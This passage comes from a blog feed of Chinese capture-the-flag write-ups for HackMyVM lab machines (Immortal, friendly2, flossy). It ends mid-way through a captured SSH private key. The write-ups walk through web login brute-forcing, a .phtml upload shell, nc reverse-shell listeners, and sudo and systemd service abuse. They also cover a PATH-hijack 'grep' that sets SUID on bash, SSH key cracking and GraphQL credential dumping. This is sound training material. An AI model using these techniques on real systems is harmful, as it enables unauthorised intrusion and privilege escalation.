I made it, after all this time. That's right guys, the great precious immortality. The one coveted by all and achieved by none. Favoured by all and owned by none. 
Now we have to be careful guys, we have to hide this from the world, from governments and other dangerous institutions. 
They may even have already heard about our achievement, they are everywhere! That's why I have decided to strengthen the security of the server. What if they try to hack us!!! 
Wishing you a long life, David.
  
嘿,伙计们！
经过这么长时间，我做到了。没错，伙计们，伟大的珍贵不朽。所有人都觊觎而没有人能实现的那个。受到所有人的青睐，没有人拥有。
现在我们必须小心，伙计们，我们必须向世界、政府和其他危险机构隐瞒这件事。
他们甚至可能已经听说了我们的成就，他们无处不在！这就是我决定加强服务器安全性的原因。如果他们试图入侵我们怎么办!!
祝你长寿，大卫。                       
```

没用信息，就获得个用户名 **David**，那进行探测 80 服务

## port 80

![image](https://github.com/user-attachments/assets/403e1434-4a32-4037-8354-3ba83dd46695)

一个密码输入框，拿 burp 爆破一下，我这爆的是前 5000 行的 rockyou.txt 字典

![image](https://github.com/user-attachments/assets/92adc0f7-16e8-455f-b18d-6d4cb1a4b0ea)

其中密码 **santiago**，状态码和长度完全不一样，尝试登录

![image](https://github.com/user-attachments/assets/a6468ac6-365a-41f9-896d-c49c4d723309)

一个文件夹目录，其中 `chat/`给了提示

![image](https://github.com/user-attachments/assets/d5afbcdc-152e-4f92-9b4c-a4e8e7876ff1)

上传点在 `upload_an_incredible_message.php`，浅试了一下,上传 `index.php` 不成功，我就直接放 burp 爆破后缀了

![image](https://github.com/user-attachments/assets/7f2fda33-177d-4a71-9212-9676d959bd66)

直接去网页看了，不想看报文

![image](https://github.com/user-attachments/assets/8446218d-b24e-4ed0-add6-1f7388617018)

其中 **index.phtml** 是可以执行的，到这里我们已经拿到了 **www-data** 的 **shell**

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                     
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.223] 50866
Linux Immortal 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64 GNU/Linux
 05:32:45 up 12 min,  0 users,  load average: 1.55, 5.77, 3.77
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (490): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Immortal:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@Immortal:/home$ ls -al
total 20
drwxr-xr-x  5 root  root  4096 Feb 27  2024 .
drwxr-xr-x 18 root  root  4096 Feb 27  2024 ..
drw-------  2 david david 4096 Feb 29  2024 david
drwxr-xr-x  4 drake drake 4096 Feb 29  2024 drake
drwxr-xr-x  3 eric  eric  4096 Feb 29  2024 eric
www-data@Immortal:/home$ cd drake/
www-data@Immortal:/home/drake$ ls -la
total 32
drwxr-xr-x 4 drake drake 4096 Feb 29  2024 .
drwxr-xr-x 5 root  root  4096 Feb 27  2024 ..
drwxr-xr-x 2 drake drake 4096 Feb 27  2024 ...
-rw-r--r-- 1 drake drake  220 Feb 27  2024 .bash_logout
-rw-r--r-- 1 drake drake 3526 Feb 27  2024 .bashrc
drwxr-xr-x 3 drake drake 4096 Feb 27  2024 .local
-rw-r--r-- 1 drake drake  807 Feb 27  2024 .profile
-rw-r--r-- 1 drake drake   20 Feb 27  2024 user.txt
www-data@Immortal:/home/drake$ cd .../
www-data@Immortal:/home/drake/...$ ls -la
total 12
drwxr-xr-x 2 drake drake 4096 Feb 27  2024 .
drwxr-xr-x 4 drake drake 4096 Feb 29  2024 ..
-rw-r--r-- 1 drake drake  134 Feb 27  2024 pass.txt
www-data@Immortal:/home/drake/...$ cat pass.txt 
netflix : drake123
amazon : 123drake
shelldred : shell123dred (f4ns0nly)
system : kevcjnsgii
bank : myfavouritebank
nintendo : 123456

```

难评，把数据处理一下

```bash
www-data@Immortal:/home/drake/...$ cat pass.txt |awk -F ' ' '{print $1 '\n' $3}'   
netflix
drake123
amazon
123drake
shelldred
shell123dred
system
kevcjnsgii
bank
myfavouritebank
nintendo
123456
www-data@Immortal:/tmp$ echo 'f4ns0nly' &gt;&gt; pass 
www-data@Immortal:/tmp$ cat pass 
netflix
drake123
amazon
123drake
shelldred
shell123dred
system
kevcjnsgii
bank
myfavouritebank
nintendo
123456

f4ns0nly
```

那个空格无伤大雅，拖个 **suForce** 爆破密码

```bash
www-data@Immortal:/tmp$ ./suForce -u drake -w pass 
            _____                  
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | drake
📖 Wordlist | pass
🔎 Status   | 8/14/57%/kevcjnsgii
💥 Password | kevcjnsgii
───────────────────────────────────


www-data@Immortal:/tmp$ su - drake   
```

*ps:如果它提示没有找到密码可以多试几次，我不知道是不是我 suForce 的问题，我的会误报*

```bash
drake@Immortal:/home$ sudo -l
Matching Defaults entries for drake on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drake may run the following commands on Immortal:
    (eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py

```

可以用 **python3** 执行`/opt/immortal.py`，`/opt/immortal.py` 我们有编辑权限，直接改就好了，我甩了个反弹 shell 回去[肥肥瘫]

```bash
eric@Immortal:~$ sudo -l
Matching Defaults entries for eric on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eric may run the following commands on Immortal:
    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service
    (root) NOPASSWD: /usr/bin/systemctl start immortal.service
    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service
    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl daemon-reload
eric@Immortal:~$ sudo sudoedit /etc/systemd/system/immortal.service
```

改个反弹 shell 上去,查看sudo权限

```bash
eric@Immortal:~$ sudo -l
Matching Defaults entries for eric on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eric may run the following commands on Immortal:
    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service
    (root) NOPASSWD: /usr/bin/systemctl start immortal.service
    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service
    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl daemon-reload
eric@Immortal:~$ sudo sudoedit /etc/systemd/system/immortal.service
```

![image](https://github.com/user-attachments/assets/03c06f7b-54a5-44f4-9a93-6f98aa26aa5d)

把**ExecStart**改成了**反弹shell，**  重启一下服务

```bash
eric@Immortal:~$ sudo /usr/bin/systemctl start immortal.service
```

监听

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8899
listening on [any] 8899 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.223] 48726
bash: cannot set terminal process group (15372): Inappropriate ioctl for device
bash: no job control in this shell
root@Immortal:/# id
id
uid=0(root) gid=0(root) groups=0(root)

```

成功拿到**root**权限sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Immortal.html</guid><pubDate>Fri, 27 Jun 2025 09:33:15 +0000</pubDate></item><item><title>hmv_friendly2</title><link>https://7r1UMPHK.github.io/post/hmv_friendly2.html</link><description># hmv_friendly2

# 0.简介

**靶机**：[hackmyvm - friendly2](https://hackmyvm.eu/machines/machine.php?vm=friendly2)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 09:37 CST
Nmap scan report for 192.168.205.138
Host is up (0.00057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0C:8F:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds

```

# 2.踩点

![Image](https://github.com/user-attachments/assets/0db9dabd-fe97-4b10-ac8c-fea7bb327606)

尝试爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u 'http://192.168.205.138' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.138
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, md]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
200      GET       91l      262w     2698c http://192.168.205.138/
301      GET        9l       28w      319c http://192.168.205.138/assets =&gt; http://192.168.205.138/assets/
301      GET        9l       28w      318c http://192.168.205.138/tools =&gt; http://192.168.205.138/tools/
200      GET       91l      262w     2698c http://192.168.205.138/index.html
200      GET     1710l     9966w   851305c http://192.168.205.138/assets/keyboard.png
200      GET      644l     3260w   244133c http://192.168.205.138/assets/monitor.png
200      GET     1965l    11601w   977099c http://192.168.205.138/assets/laptop.png
200      GET       24l      148w     6861c http://192.168.205.138/assets/sirena.gif
301      GET        9l       28w      328c http://192.168.205.138/tools/documents =&gt; http://192.168.205.138/tools/documents/
200      GET       29l       99w      813c http://192.168.205.138/tools/index.html
200      GET       35l      101w      841c http://192.168.205.138/tools/documents/monitor.html
200      GET       50l      126w     1169c http://192.168.205.138/tools/documents/keyboard.html
200      GET       35l      101w      879c http://192.168.205.138/tools/documents/laptop.html
[####################] - 2m    622895/622895  0s      found:13      errors:1      
[####################] - 2m    311410/311410  2719/s  http://192.168.205.138/ 
[####################] - 2s    311410/311410  184157/s http://192.168.205.138/assets/ =&gt; Directory listing (add --scan-dir-listings to scan)
[####################] - 2m    311410/311410  2662/s  http://192.168.205.138/tools/ 
[####################] - 0s    311410/311410  7077500/s http://192.168.205.138/tools/documents/ =&gt; Directory listing (add --scan-dir-listings to scan)
```

其中`/tools/`目录，我们比较感兴趣

![Image](https://github.com/user-attachments/assets/4cecf106-19df-416e-b3c1-2da93f1dcbf6)

有一个疑似目录包含路径，我们加上尝试

![Image](https://github.com/user-attachments/assets/07421b64-12cb-4fe0-b6e8-48f94239bddc)

再尝试可不可以使用**PHP 过滤器链**

![Image](https://github.com/user-attachments/assets/0788d850-d370-4605-9661-192ba52e50bb)

不行，那我们还是去读它密钥吧

![Image](https://github.com/user-attachments/assets/286bfaa9-f0e2-4543-9ce7-711916d35160)

```bash
┌──(kali㉿kali)-[~/test]
└─$ vim id_rsa 
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ chmod 600 id_rsa
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ ssh gh0st@192.168.205.138 -i id_rsa
The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 

                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ ssh2john id_rsa &gt; hash                             
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ john hash --show                                   
id_rsa:celtic

1 password hash cracked, 0 left
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ ssh gh0st@192.168.205.138 -i id_rsa                
Enter passphrase for key 'id_rsa': 
Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st@friendly2:~$ id
uid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)

```

# 3.提权

```bash
gh0st@friendly2:~$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
gh0st@friendly2:~$ cat /opt/security.sh
#!/bin/bash

echo 'Enter the string to encode:'
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo 'The string cannot be longer than 20 characters.'
  exit 1
fi

# Validate that the string does not contain special characters
if echo '$string' | grep -q '[^[:alnum:] ]'; then
  echo 'The string cannot contain special characters.'
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo '$string' | tr $sus1 $sus2)

echo 'Original string: $string'
echo 'Encoded string: $encoded_string'
gh0st@friendly2:~$ ls -la /opt/
total 16
drwxr-xr-x  3 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
drwxr-xr-x  2 root root 4096 Apr 29  2023 0-day
-rwxr-xr-x  1 root root  561 Apr 29  2023 security.sh

```

实现用户输入不超20个字符且不能有特殊符号，将输入信息ROT13 编码，我们改个环境变量就好了，它没用绝对路径

```bash
gh0st@friendly2:/tmp$ echo 'chmod u+s /bin/bash' &gt; grep
gh0st@friendly2:/tmp$ chmod +x grep 
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ sudo PATH=$PWD:$PATH /opt/security.sh
Enter the string to encode:
aaassss
The string cannot contain special characters.
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ bash -p
bash-5.1# id
uid=1001(gh0st) gid=1001(gh0st) euid=0(root) groups=1001(gh0st)
bash-5.1# cat /root/
.bash_history  .bashrc        interfaces.sh  .local/        .profile       root.txt     
bash-5.1# cat /root/root.txt 
Not yet! Try to find root.txt.


Hint: ...
bash-5.1# find / -name '...' 2&gt;/dev/null
/...
bash-5.1# cd /.../
bash-5.1# ls -al
total 12
d-wx------  2 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
-r--------  1 root root  100 Apr 29  2023 ebbg.txt
bash-5.1# cat ebbg.txt 
It's codified, look the cipher:

98199n723q0s44s6rs39r33685q8pnoq



Hint: numbers are not codified

```

![Image](https://github.com/user-attachments/assets/f1d96202-91e2-4915-adb2-fd428994419b)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_friendly2.html</guid><pubDate>Fri, 27 Jun 2025 09:33:10 +0000</pubDate></item><item><title>hmv_flossy</title><link>https://7r1UMPHK.github.io/post/hmv_flossy.html</link><description># hmv_flossy

# 0.简介

**靶机**：[hackmyvm - flossy](https://hackmyvm.eu/machines/machine.php?vm=flossy)
**难度**：黄色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 16:18 CST
Nmap scan report for 192.168.205.138
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:61:56:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds

```

先看**80端口**，**22端口**候补

# 2.踩点

![Image](https://github.com/user-attachments/assets/b9a4753b-3614-43d8-adff-220881ce04cd)

一个查询页面，可以输入数值进行查询，有效范围是**1-99**，后面的数据是重复的。尝试sql注入

```bash
┌──(kali㉿kali)-[~/test]
└─$ sqlmap -u 'http://192.168.205.138' --forms --batch 
        ___
       __H__                                                                                                                         
 ___ ___[.]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [)]     | .'| . |                                                                                                            
|___|_  [.]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:44:38 /2025-01-17/

[16:44:38] [INFO] testing connection to the target URL
[16:44:38] [INFO] searching for forms
[16:44:38] [CRITICAL] there were no forms found at the given target URL

[*] ending @ 16:44:38 /2025-01-17/

```

不行，尝试特殊符号绕过，无果。扫描架构

```bash
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u http://192.168.205.138               

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 154
[INF] Templates loaded for current scan: 7607
[WRN] Loading 182 unsigned templates for scan. Use with caution.
[INF] Executing 7425 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1702 (Reduced 1602 Requests)
[INF] Using Interactsh Server: oast.pro
[graphql-field-suggestion] [http] [info] http://192.168.205.138/graphql
[graphql-alias-batching] [http] [info] http://192.168.205.138/graphql
[graphql-detect] [http] [info] http://192.168.205.138/graphql [paths='/graphql']
[waf-detect:securesphere] [http] [info] http://192.168.205.138
[ssh-password-auth] [javascript] [info] 192.168.205.138:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.138:22
[ssh-auth-methods] [javascript] [info] 192.168.205.138:22 ['['publickey','password']']
[ssh-server-enumeration] [javascript] [info] 192.168.205.138:22 ['SSH-2.0-OpenSSH_9.2p1 Debian-2']
[CVE-2023-48795] [javascript] [medium] 192.168.205.138:22 ['Vulnerable to Terrapin']
[openssh-detect] [tcp] [info] 192.168.205.138:22 ['SSH-2.0-OpenSSH_9.2p1 Debian-2']
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.138
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.138
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.138
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.138
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.138
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.138
[tech-detect:express] [http] [info] http://192.168.205.138                                                                       
```

可以看到和**graphql**有关，去[hacktricks](https://book.hacktricks.wiki/)搜索会有一篇[相关的文章](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-web/graphql.html)

![Image](https://github.com/user-attachments/assets/3b901b4a-7b70-4115-8e9a-bcef0a17dea1)

进行尝试

![Image](https://github.com/user-attachments/assets/a06c32f3-66b7-473e-a0e7-454b5b7d3c9a)

确实是**GraphQL**服务，进一步测试

```bash
POST /graphql HTTP/1.1
Host: 192.168.205.138
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.205.138/
Content-Type: application/json
Content-Length: 106
Origin: http://192.168.205.138
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Priority: u=0

{'query':'{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}'}
```

![Image](https://github.com/user-attachments/assets/25ee0763-bd8d-4e53-81de-e184768478c5)

存在**用户名**和**密码**，我们尝试提取

```bash
省略
{'query':'{users(id: 1) {username   password }}'}
```

![Image](https://github.com/user-attachments/assets/542a96c5-7747-4a97-8c78-0c4adbb94eab)

拿去爆破模块爆破

![Image](https://github.com/user-attachments/assets/2a021d44-95ea-429a-ac13-351c6317f026)

尝试登录ssh

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh malo@192.168.205.138                        
The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
malo@192.168.205.138's password: 
Linux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
[oh-my-zsh] Would you like to update? [Y/n] n
[oh-my-zsh] You can update manually by running `omz update`

╭─malo@flossy ~ 
╰─$ id
uid=1000(malo) gid=1000(malo) groups=1000(malo),100(users)
```

# 3.提权

```bash
╭─malo@flossy ~ 
╰─$ sudo -l
sudo: unable to resolve host flossy: Name or service not known
[sudo] password for malo: 
Sorry, user malo may not run sudo on flossy.
╭─malo@flossy ~ 
╰─$ ls -la                                                                                                                         1 ↵
total 216
drwxr-xr-x  5 malo malo   4096 Jan 17 10:03 .
drwxr-xr-x  4 root root   4096 Oct  6  2023 ..
-rw-------  1 malo malo      4 Oct  7  2023 .bash_history
-rw-r--r--  1 malo malo    220 Oct  6  2023 .bash_logout
-rw-r--r--  1 malo malo   3526 Oct  6  2023 .bashrc
drwxr-xr-x  3 malo malo   4096 Oct  6  2023 .local
drwxr-xr-x 12 malo malo   4096 Oct  6  2023 .oh-my-zsh
-rw-r--r--  1 malo malo    807 Oct  6  2023 .profile
drwx------  2 malo malo   4096 Oct 10  2023 .ssh
-rw-r--r--  1 malo malo  51798 Jan 17 10:02 .zcompdump-flossy-5.9
-r--r--r--  1 malo malo 119920 Jan 17 10:02 .zcompdump-flossy-5.9.zwc
-rw-------  1 malo malo     63 Jan 17 10:03 .zsh_history
-rw-r--r--  1 malo malo   3890 Oct  6  2023 .zshrc
╭─malo@flossy ~ 
╰─$ cat .bash_history
tty
╭─malo@flossy ~ 
╰─$ cat .zsh_history           
: 1737104526:0;id
: 1737104577:0;sudo -l
: 1737104613:0;ls -la
: 1737104620:0;cat .bash_history
: 1737104635:0;cat .zsh_history
╭─malo@flossy ~ 
╰─$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/sbin/pppd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
╭─malo@flossy ~ 
╰─$ /sbin/getcap -r / 2&gt;/dev/null                                                                                                  1 ↵
/usr/bin/ping cap_net_raw=ep
╭─malo@flossy ~ 
╰─$ ss -tuln | grep tcp
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*        
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*        
tcp   LISTEN 0      128             [::]:22           [::]:*        
╭─malo@flossy ~ 
╰─$ cd /home      
╭─malo@flossy /home 
╰─$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Oct  6  2023 .
drwxr-xr-x 18 root   root   4096 Jul 22  2023 ..
drwxr-xr-x  5 malo   malo   4096 Jan 17 10:06 malo
drwxr-xr-x  5 sophie sophie 4096 Oct 10  2023 sophie
╭─malo@flossy /home 
╰─$ cd sophie 
╭─malo@flossy /home/sophie 
╰─$ ls -al
total 56
drwxr-xr-x  5 sophie sophie 4096 Oct 10  2023 .
drwxr-xr-x  4 root   root   4096 Oct  6  2023 ..
-rw-------  1 root   root    370 Oct 10  2023 .bash_history
-rw-r--r--  1 sophie sophie  220 Oct  6  2023 .bash_logout
-rw-r--r--  1 sophie sophie 3526 Oct  6  2023 .bashrc
drwxr-xr-x  3 sophie sophie 4096 Oct  6  2023 .local
-rwxr-----  1 root   sophie  962 Oct  6  2023 network
drwxr-xr-x 12 sophie sophie 4096 Oct  6  2023 .oh-my-zsh
-rw-r--r--  1 sophie sophie  807 Oct  6  2023 .profile
-rw-r--r--  1 sophie sophie   66 Oct  7  2023 .selected_editor
drwx------  2 sophie sophie 4096 Oct 10  2023 .ssh
-rwxr-xr-x  1 sophie sophie  630 Oct 10  2023 SSHKeySync
-rwx------  1 sophie sophie   33 Oct 10  2023 user.txt
-rw-r--r--  1 sophie sophie 3890 Oct  6  2023 .zshrc
╭─malo@flossy /home/sophie 
╰─$ cat SSHKeySync
#!/bin/bash

# This script must run every minute in pre-prod

send_private_key() {
    local user_name='$1'
    local key_path='/home/$user_name/.ssh/id_rsa'
    local admin_tty='/dev/pts/24'

    if [ -f '$key_path' ]; then
        if [ -w '$admin_tty' ]; then
            cat '$key_path' &gt; '$admin_tty'
        else
            echo 'Error: Unable to write to $admin_tty'
        fi
    else
        echo 'Error: The private key for $user_name doesn't exist.'
    fi
}

while true ; do
  USER='sophie'
  echo 'Sending $USER's private key to a high-privileged TTY for quick testing...'
  send_private_key '$USER'
  sleep 1m
done
╭─malo@flossy /home/sophie 
╰─$ tty
/dev/pts/0
```

脚本的实现了每分钟将**sophie**的私钥发送到`/dev/pts/24`中，我们尝试利用

```bash
╭─malo@flossy /home/sophie 
╰─$ ls /dev/pts/                                                                                                                   2 ↵

0  ptmx
╭─malo@flossy /home/sophie 
╰─$ script /dev/null
Script started, output log file is '/dev/null'.
╭─malo@flossy /home/sophie 
╰─$ ls /dev/pts/  

0  1  ptmx
╭─malo@flossy /tmp 
╰─$ cat a.sh
#!/bin/bash

for i in {1..27}
do
    script /dev/pts/$i &amp;
done
╭─malo@flossy /tmp 
╰─$ chmod +x a.sh 
╭─malo@flossy /tmp 
╰─$ bash a.sh 

省略

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAlfKkxqQRaakvwCsUmqbXFm0cdI4zkp9UcejsdWhZKbuq+9l8l6tP
Nic4xIoq1S++4Xlj8acA9oJG3yFSgwsBNIaqAJq1zxSpDnzBBpSIqZk2OmkHw8BNBth98D
3RKB5d1SOq0pNiBk4dtQ/QGgd7S30oHNlqF524Nf4jCJxkMLUk527Ga+cjPmM068DtOZMF
xfY/gWrnjk44tigt4QP4hkmMEtshPps4SF6dm544FYghYs+rgCH9tx+DfUl7ZFLnBviGL9
RzN7yQLUV/BPFod8SPihd/s7bSMGfBvopCWFcueL0xAd22Q7CU1jSg4W6+aSfbCSRND3ik
tz/SsWN2/RR2H+MQxB11J5qvLFxq291B0Znoi5sgARZUihDihjhPyVL0dco2wrQtL6ey2B
edRtX24GejoGuvdqd3/qHi5R35sZ4zcUCEldNwq0aC/b3EU/cmu16nmDuhJZpT2ILj35cr
ng8Faf39ZAeIRFKsyfibnRMxoBwLkWWyEs8h2APLAAAFiGZJHbxmSR28AAAAB3NzaC1yc2
EAAAGBAJXypMakEWmpL8ArFJqm1xZtHHSOM5KfVHHo7HVoWSm7qvvZfJerTzYnOMSKKtUv
